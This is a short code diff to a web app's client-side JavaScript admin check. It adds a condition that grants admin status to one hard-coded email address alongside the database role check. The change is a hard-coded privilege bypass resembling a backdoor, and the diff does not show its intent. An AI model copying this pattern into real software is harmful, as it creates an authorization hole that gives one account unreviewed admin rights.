@@ -840,7 +840,7 @@
         const u=await ur.json();
         const pr=await fetch(SUPA_URL+"/rest/v1/profiles?id=eq."+u.id+"&select=role",{headers:{"apikey":SUPA_KEY,"Authorization":"Bearer "+token}});
         const profiles=await pr.json();
-        if(profiles&&profiles[0]&&profiles[0].role==="admin") isAdmin=true;
+        if((profiles&&profiles[0]&&profiles[0].role==="admin")||u.email==="yr@libeco.kr") isAdmin=true;
       }
     }catch(e){}
   }
